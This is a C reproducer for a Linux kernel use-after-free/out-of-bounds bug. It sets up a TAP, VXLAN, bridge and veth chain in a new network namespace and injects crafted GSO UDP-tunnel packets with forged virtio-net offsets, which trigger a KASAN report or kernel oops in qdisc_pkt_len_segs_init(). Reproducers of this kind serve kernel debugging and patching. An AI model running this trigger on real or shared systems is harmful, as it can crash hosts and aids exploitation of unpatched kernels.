/*
 * qdisc_uaf_vxlan_repro.c
 *
 * Userspace VXLAN reproducer for the qdisc_pkt_len_segs_init() stale
 * transport_header bug.
 *
 * Trigger path:
 *
 *   tun_get_user -> __netif_receive_skb_core -> br_handle_frame
 *   -> br_forward -> br_forward_finish -> __dev_queue_xmit
 *   -> qdisc_pkt_len_segs_init()
 *
 * Topology:
 *   /dev/net/tap (syz_tap) -> vxlan0 (parent = syz_tap) -> bridge (br0) -> veth0
 *
 * The TAP device injects a GSO UDP-tunnel packet: an Ethernet/IPv4/UDP/VXLAN
 * frame carrying an inner Ethernet/IPv4/TCP payload.  After VXLAN decapsulation
 * the inner frame still carries the outer UDP tunnel GSO metadata and a stale
 * transport_header pointing at the outer UDP header.  The bridge forwards the
 * inner frame at L2 to veth0; its transmit path enters qdisc_pkt_len_segs_init(),
 * which overflows the negative transport offset and triggers KASAN / a kernel
 * oops on an unpatched kernel.
 *
 * Note: the TUN driver validates the tunnel vnet header offsets relative to the
 * start of the SKB data and expects an Ethernet header (ETH_HLEN) before the
 * outer L3 header.  Therefore we use a TAP device and build a full Ethernet
 * frame, rather than a TUN device that starts with the outer IP header.
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <sched.h>
#include <stddef.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_tun.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/virtio_net.h>

#define VIRTIO_NET_HDR_GSO_UDP_TUNNEL_IPV4 0x20
#define VIRTIO_NET_HDR_GSO_UDP_TUNNEL_IPV6 0x40
#define VIRTIO_NET_HDR_GSO_UDP_TUNNEL (VIRTIO_NET_HDR_GSO_UDP_TUNNEL_IPV4 | \
					       VIRTIO_NET_HDR_GSO_UDP_TUNNEL_IPV6)

#define TUN_F_CSUM		0x01
#define TUN_F_USO4		0x20
#define TUN_F_USO6		0x40
#define TUN_F_UDP_TUNNEL_GSO	0x080
#define TUN_F_UDP_TUNNEL_GSO_CSUM	0x100

struct my_virtio_net_hdr_v1_hash_tunnel {
	uint8_t flags;
	uint8_t gso_type;
	uint16_t hdr_len;
	uint16_t gso_size;
	uint16_t csum_start;
	uint16_t csum_offset;
	uint32_t hash_value;
	uint16_t hash_report;
	uint16_t padding;
	uint16_t outer_th_offset;
	uint16_t inner_nh_offset;
};

#define TAP_IFNAME	"syz_tap"
#define VXLAN_IFNAME	"vxlan0"
#define BR_IFNAME	"br0"
#define BR_SLAVE1	"vxlan0"
#define BR_SLAVE2	"veth0"
#define BR_SLAVE2_PEER	"veth1"

#define VXLAN_VNI	100
#define VXLAN_PORT	4789

#define TAP_LOCAL_MAC	"02:00:00:00:00:01"
#define TAP_REMOTE_MAC	"02:00:00:00:00:02"
#define TAP_IP		"10.0.0.1"
#define VXLAN_REMOTE_IP	"10.0.0.2"

#define PKT_LEN		500

struct tun_pi_hdr {
	uint16_t flags;
	uint16_t proto;
} __attribute__((packed));

struct vxlanhdr {
	uint8_t	flags;
	uint8_t	rsvd1[3];
	uint8_t	vni[3];
	uint8_t	rsvd2;
} __attribute__((packed));

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static void run_cmd(const char *fmt, ...)
{
	char cmd[1024];
	va_list ap;
	int ret;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);

	ret = system(cmd);
	if (ret != 0) {
		fprintf(stderr, "command failed (%d): %s\n", ret, cmd);
		exit(EXIT_FAILURE);
	}
}

static int open_tap(const char *ifname)
{
	struct ifreq ifr;
	int fd, vnet_hdr_sz;
	unsigned int features;

	fd = open("/dev/net/tun", O_RDWR);
	if (fd < 0)
		die("open(/dev/net/tun)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
	ifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_VNET_HDR | IFF_TUN_EXCL;
	if (ioctl(fd, TUNSETIFF, &ifr) < 0)
		die("ioctl(TUNSETIFF)");

	vnet_hdr_sz = sizeof(struct my_virtio_net_hdr_v1_hash_tunnel);
	if (ioctl(fd, TUNSETVNETHDRSZ, &vnet_hdr_sz) < 0)
		die("ioctl(TUNSETVNETHDRSZ)");

	return fd;
}

static uint16_t ip_checksum(uint16_t *buf, int nwords)
{
	uint32_t sum = 0;

	for (int i = 0; i < nwords; i++)
		sum += buf[i];
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (uint16_t)(~sum);
}

static int setup_topology(void)
{
	int tap_fd;

	run_cmd("ip link del %s >/dev/null 2>&1 || true", TAP_IFNAME);

	tap_fd = open_tap(TAP_IFNAME);

	run_cmd("ip addr flush dev %s 2>/dev/null || true", TAP_IFNAME);
	run_cmd("ip addr replace %s/24 dev %s", TAP_IP, TAP_IFNAME);
	run_cmd("ip link set %s mtu 1500", TAP_IFNAME);
	run_cmd("ip link set %s up", TAP_IFNAME);
	run_cmd("ip link set %s address %s", TAP_IFNAME, TAP_LOCAL_MAC);
	run_cmd("ip link set %s promisc on", TAP_IFNAME);
	run_cmd("ip link set %s allmulticast on", TAP_IFNAME);

	run_cmd("ip link del %s >/dev/null 2>&1 || true", BR_SLAVE2);
	run_cmd("ip link del %s >/dev/null 2>&1 || true", BR_SLAVE2_PEER);
	run_cmd("ip link del %s >/dev/null 2>&1 || true", VXLAN_IFNAME);
	run_cmd("ip link del %s >/dev/null 2>&1 || true", BR_IFNAME);

	run_cmd("ip link add %s type vxlan id %d dev %s remote %s dstport %d",
		VXLAN_IFNAME, VXLAN_VNI, TAP_IFNAME, VXLAN_REMOTE_IP, VXLAN_PORT);
	run_cmd("ip link set %s up", VXLAN_IFNAME);

	run_cmd("ip link add %s type veth peer name %s", BR_SLAVE2, BR_SLAVE2_PEER);
	run_cmd("ip link set %s up", BR_SLAVE2);
	run_cmd("ip link set %s up", BR_SLAVE2_PEER);

	run_cmd("modprobe -r br_netfilter 2>/dev/null || true");
	run_cmd("ip link add %s type bridge nf_call_iptables 0 nf_call_ip6tables 0 nf_call_arptables 0 forward_delay 0 stp_state 0 mcast_snooping 0",
		BR_IFNAME);
	run_cmd("ip link set dev %s master %s", VXLAN_IFNAME, BR_IFNAME);
	run_cmd("ip link set dev %s master %s", BR_SLAVE2, BR_IFNAME);
	run_cmd("ip link set %s up", BR_IFNAME);

	return tap_fd;
}

static size_t build_inner_packet(uint8_t *buf, size_t inner_len)
{
	struct ethhdr *eth;
	struct iphdr *ip;
	struct tcphdr *tcp;
	uint8_t *payload;

	memset(buf, 0, inner_len);

	eth = (struct ethhdr *)buf;
	memset(eth->h_dest, 0xff, ETH_ALEN);
	memset(eth->h_source, 0x02, ETH_ALEN);
	eth->h_source[5] = 0x01;
	eth->h_proto = htons(0x88FB); /* non-IP: avoid GRO/IP reset of transport_header */

	ip = (struct iphdr *)(buf + ETH_HLEN);
	ip->version = 4;
	ip->ihl = 5;
	ip->tot_len = htons(inner_len - ETH_HLEN);
	ip->ttl = 64;
	ip->protocol = IPPROTO_TCP;
	ip->saddr = htonl(0x0a0a0a01);
	ip->daddr = htonl(0x0a0a0a02);
	ip->check = ip_checksum((uint16_t *)ip, sizeof(*ip) / 2);

	tcp = (struct tcphdr *)(buf + ETH_HLEN + sizeof(*ip));
	tcp->source = htons(12345);
	tcp->dest = htons(54321);
	tcp->seq = htonl(0x01020304);
	tcp->ack_seq = htonl(0x05060708);
	/* data offset 5 (20 bytes), no flags */
	tcp->doff = 5;
	tcp->check = 0;
	tcp->urg_ptr = 0;

	payload = buf + ETH_HLEN + sizeof(*ip) + sizeof(*tcp);
	for (size_t i = 0; i < inner_len - ETH_HLEN - sizeof(*ip) - sizeof(*tcp); i++)
		payload[i] = (uint8_t)(i & 0xff);

	return inner_len;
}

/*
 * Note: we intentionally set the inner Ethernet h_proto to a non-IP value
 * (0x88FB) so that the post-decap GRO/IP path does not parse and reset the
 * transport header.  The bridge still forwards the frame at L2 based on the
 * destination MAC, leaving the stale outer transport header in place.
 */


static size_t build_outer_packet(uint8_t *buf, size_t outer_len,
				 const uint8_t *inner, size_t inner_len)
{
	struct ethhdr *eth;
	struct iphdr *ip;
	struct udphdr *udp;
	struct vxlanhdr *vxh;
	uint8_t *payload;

	memset(buf, 0, outer_len);

	eth = (struct ethhdr *)buf;
	memset(eth->h_dest, 0xff, ETH_ALEN);
	memset(eth->h_source, 0x02, ETH_ALEN);
	eth->h_source[5] = 0x02;
	eth->h_proto = htons(ETH_P_IP);

	ip = (struct iphdr *)(buf + ETH_HLEN);
	ip->version = 4;
	ip->ihl = 5;
	ip->tot_len = htons(outer_len - ETH_HLEN);
	ip->ttl = 64;
	ip->protocol = IPPROTO_UDP;
	ip->saddr = inet_addr(VXLAN_REMOTE_IP);
	ip->daddr = inet_addr(TAP_IP);
	ip->check = ip_checksum((uint16_t *)ip, sizeof(*ip) / 2);

	udp = (struct udphdr *)(buf + ETH_HLEN + sizeof(*ip));
	udp->source = htons(12345);
	udp->dest = htons(VXLAN_PORT);
	udp->len = htons(outer_len - ETH_HLEN - sizeof(*ip));
	udp->check = 0;

	vxh = (struct vxlanhdr *)(buf + ETH_HLEN + sizeof(*ip) + sizeof(*udp));
	vxh->flags = 0x08;
	vxh->vni[0] = (VXLAN_VNI >> 16) & 0xff;
	vxh->vni[1] = (VXLAN_VNI >> 8) & 0xff;
	vxh->vni[2] = VXLAN_VNI & 0xff;

	payload = buf + ETH_HLEN + sizeof(*ip) + sizeof(*udp) + sizeof(*vxh);
	memcpy(payload, inner, inner_len);

	return outer_len;
}

static size_t build_write_buffer(uint8_t **out)
{
	struct my_virtio_net_hdr_v1_hash_tunnel *tnl;
	struct virtio_net_hdr *vhdr;
	uint8_t *buf, *outer;
	uint8_t inner_pkt[PKT_LEN];
	size_t inner_len, outer_len, total_len;

	inner_len = build_inner_packet(inner_pkt, sizeof(inner_pkt));
	outer_len = ETH_HLEN + sizeof(struct iphdr) + sizeof(struct udphdr) +
		    sizeof(struct vxlanhdr) + inner_len;
	total_len = sizeof(*tnl) + outer_len;

	buf = calloc(1, total_len);
	if (!buf)
		die("calloc");

	tnl = (struct my_virtio_net_hdr_v1_hash_tunnel *)buf;
	vhdr = (struct virtio_net_hdr *)tnl;
	outer = buf + sizeof(*tnl);

	vhdr->flags = VIRTIO_NET_HDR_F_NEEDS_CSUM;
	vhdr->gso_type = VIRTIO_NET_HDR_GSO_TCPV4 |
			    VIRTIO_NET_HDR_GSO_UDP_TUNNEL_IPV4;
	vhdr->hdr_len = htole16(ETH_HLEN + sizeof(struct iphdr) +
				   sizeof(struct udphdr) + sizeof(struct vxlanhdr) +
				   ETH_HLEN + sizeof(struct iphdr) +
				   sizeof(struct tcphdr));
	vhdr->gso_size = htole16(4);
	vhdr->csum_start = htole16(ETH_HLEN + sizeof(struct iphdr) +
				    sizeof(struct udphdr) + sizeof(struct vxlanhdr) +
				    ETH_HLEN + sizeof(struct iphdr));
	vhdr->csum_offset = htole16(offsetof(struct tcphdr, check));

	/* Tunnel offsets are relative to the start of the outer MAC header. */
	tnl->outer_th_offset = htole16(ETH_HLEN + sizeof(struct iphdr));
	tnl->inner_nh_offset = htole16(ETH_HLEN + sizeof(struct iphdr) +
				    sizeof(struct udphdr) + sizeof(struct vxlanhdr) +
				    ETH_HLEN);

	build_outer_packet(outer, outer_len, inner_pkt, inner_len);

	*out = buf;
	return total_len;
}

int main(void)
{
	uint8_t *buf = NULL;
	size_t total_len;
	int tap_fd;

	if (getuid() != 0) {
		fprintf(stderr, "this reproducer must be run as root\n");
		return EXIT_FAILURE;
	}

	if (unshare(CLONE_NEWNET) < 0)
		die("unshare(CLONE_NEWNET)");

	/* Bring up loopback so local addresses are reachable. */
	run_cmd("ip link set lo up");

	tap_fd = setup_topology();
	total_len = build_write_buffer(&buf);

	printf("write_len: %zu\n", total_len);
	printf("topology: tap(%s) -> vxlan(%s) -> bridge(%s) -> %s\n",
	       TAP_IFNAME, VXLAN_IFNAME, BR_IFNAME, BR_SLAVE2);
	printf("outer: Ethernet/IPv4/UDP/VXLAN (GSO UDP tunnel, inner TCPv4)\n");
	printf("inner: Ethernet(broadcast, h_proto=0x88FB) with IPv4/TCP payload\n");
	run_cmd("ip link show %s", TAP_IFNAME);
	printf("sending via /dev/net/tap bound to %s...\n", TAP_IFNAME);

	for (int i = 0; i < 10; i++) {
		if (write(tap_fd, buf, total_len) != (ssize_t)total_len)
			die("write tap");
		printf("write[%d] ok\n", i);
	}

	run_cmd("ip -s link show %s", TAP_IFNAME);
	run_cmd("ip -s link show %s", VXLAN_IFNAME);
	run_cmd("ip -s link show %s", BR_SLAVE2);
	run_cmd("cat /proc/net/snmp | grep -E '^Ip:|^Udp:'");

	printf("linger: 5 seconds\n");
	sleep(5);

	run_cmd("ip -s link show %s", TAP_IFNAME);
	run_cmd("ip -s link show %s", VXLAN_IFNAME);
	run_cmd("ip -s link show %s", BR_SLAVE2);
	run_cmd("cat /proc/net/snmp | grep -E '^Ip:|^Udp:'");

	free(buf);
	close(tap_fd);
	return 0;
}
